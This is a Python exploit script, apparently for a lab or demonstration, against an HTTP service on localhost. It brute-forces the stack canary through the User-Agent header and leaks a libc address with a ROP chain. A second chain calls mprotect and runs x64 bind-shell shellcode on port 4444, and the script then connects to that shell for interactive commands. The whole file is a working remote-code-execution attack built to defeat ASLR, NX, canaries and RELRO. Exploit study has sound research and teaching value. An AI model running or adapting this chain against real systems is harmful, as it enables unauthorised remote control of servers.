import sys, socket, os, time
from struct import unpack, pack  

HOST = 'localhost'
PORT = 10050


# bind shell x64
# http://shell-storm.org/shellcode/files/shellcode-858.php
SHELLCODE =	"\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2" \
		"\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x11\x5c" \
		"\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05" \
		"\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89" \
		"\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f" \
		"\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21" \
		"\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68" \
		"\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89" \
		"\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05"



def send_pack(payload, load_got_before=False, send_shellcode=False):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect((HOST, PORT))

	if load_got_before == True: # used to load the resolve write@libc to use it directly
		expl_request = 	"GET / HTTP/1.1\r\n" \
				"connection: keep-alive\r\n" \
				"User-Agent: xxx\r\n\r\n"
		s.send(expl_request)
		res = s.recv(350)

	if send_shellcode == True:
		expl_request = 	"GET / HTTP/1.1\r\n" \
				"connection: close\r\n" \
				"From: " + SHELLCODE + "\r\n" \
				"User-Agent: " + payload + "\r\n\r\n"
		s.send(expl_request)
	else:
		expl_request = 	"GET / HTTP/1.1\r\n" \
				"connection: close\r\n" \
				"User-Agent: " + payload + "\r\n\r\n"
		s.send(expl_request)		

	try:
		if send_shellcode == False:
			res = s.recv(8)
		else:
			res = 1
	except socket.error, e:
		res = -1
	finally:		
		s.close()
		return res


def bruteforce_canary(start):
	canary = ""	

	for canary_byte in range(8):
		last_found = 0		
		for try_byte in range(0,255):
			if try_byte == 10 or try_byte == 13:
				continue
			ret = send_pack(start + canary + chr(try_byte))			
			if ret != -1:
				canary += chr(try_byte)
				print("Found: " + str(int(try_byte)))				
				last_found = 1
				break
		if last_found == 0:
			return -1
	return canary

print(	"----- Remote stack overflow demonstration -----\n" \
	"Author: Karl Piplies\n" \
	"Architecture: x86_64\n" \
	"Defeats: ASLR, NX, canary, relRO, fortifysrc\n" \
	"----- Remote stack overflow demonstration -----\n")



print("[%] bruteforcing stack canary...")
canary = bruteforce_canary('A'*136)
if canary == -1:
	print("  [-] Canary contains \\n or \\r")
	sys.exit(0)

#canary = "\x00\x4d\x21\x10\x09\x32\x43\xb4"
print("[+] canary: " + canary[::-1].encode("hex"))	


#send_pack('A'*160)
#sys.exit(0)

leak_got_payload = 'A'*136 				# padding
leak_got_payload += canary 				# stack canary
leak_got_payload += 'D'*8 				# saved rbp
leak_got_payload += pack("<Q", 0x0000000000403ecc)	# pop r12; pop r13; pop r14; pop r15; ret;
leak_got_payload += pack("<Q", 0x0000000000605050)	# r12 = write@plt for following callq
leak_got_payload += pack("<Q", 0x0000000000000008)	# r13 = 0x8 for rdx / third argument
leak_got_payload += pack("<Q", 0x00000000006050b0)	# r14 = read@.got.plt for rsi / second argument 
leak_got_payload += pack("<Q", 0x0000000000000004)	# r15 = 0x4 / first argument 
leak_got_payload += pack("<Q", 0x0000000000403eb0)	# mov rdx, r13; mov rsi, r14; mov edi, r15d; call QWORD PTR [r12+rbx*8];
read_ptr = send_pack(leak_got_payload, True)

if read_ptr == -1:
	print("[-] Leaking read@libc failed")
	sys.exit(0)

print("[+] read@libc: " + read_ptr[::-1].encode("hex"))


mprotect_ptr = unpack("Q", read_ptr)
mprotect_ptr = mprotect_ptr[0] + 0xa520
mprotect_ptr = pack("Q", mprotect_ptr)

print("[+] mprotect@libc: " + mprotect_ptr[::-1].encode("hex"))


libcbase_ptr = unpack("Q", read_ptr)
libcbase_ptr = libcbase_ptr[0] - 0xf7250
poprdx_ptr = libcbase_ptr + 0x0000000000001b92
libcbase_ptr = pack("Q", libcbase_ptr)

print("[+] libcbase: " + libcbase_ptr[::-1].encode("hex"))

exec_shellcode_payload = 'A'*136 
exec_shellcode_payload += canary
exec_shellcode_payload += 'D'*8
exec_shellcode_payload += pack("<Q", 0x0000000000403ed3)	# pop rdi; ret;
exec_shellcode_payload += pack("<Q", 0x0000000000605000)	# first argument for mprotect = .data
exec_shellcode_payload += pack("<Q", 0x0000000000403ed1)	# pop rsi; pop r15; ret;
exec_shellcode_payload += pack("<Q", 0x0000000000001000)	# second argument for mprotect = 0x1000
exec_shellcode_payload += pack("<Q", 0x0000000000000000)	# dummy for r15
exec_shellcode_payload += pack("<Q", poprdx_ptr)		# pop rdx; ret;
exec_shellcode_payload += pack("<Q", 0x0000000000000007)	# third argument for mprotect = 0x07
exec_shellcode_payload += mprotect_ptr				# mprotect@libc
exec_shellcode_payload += pack("<Q", 0x00000000006052a0)	# &from_email
send_pack(exec_shellcode_payload, False, True)

print("[%] trying to connect to bindshell...");

time.sleep(2)

shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	shell_socket.connect((HOST, 4444))
except socket.error, exc:
	print("[-] No connection, something failed")
	sys.exit(0)

print("[+] connected to shell")
while 1:
	cmd = raw_input("$ ")
	if cmd == "exit":
		shell_socket.send("exit")
		shell_socket.close()
		sys.exit(0)
	shell_socket.send(cmd + "\n")
	try:
		res = shell_socket.recv(8192)
	except socket.error, e:
		print("[-] connection error")
		shell_socket.close()
		sys.exit(0)	
	
	print(res)			


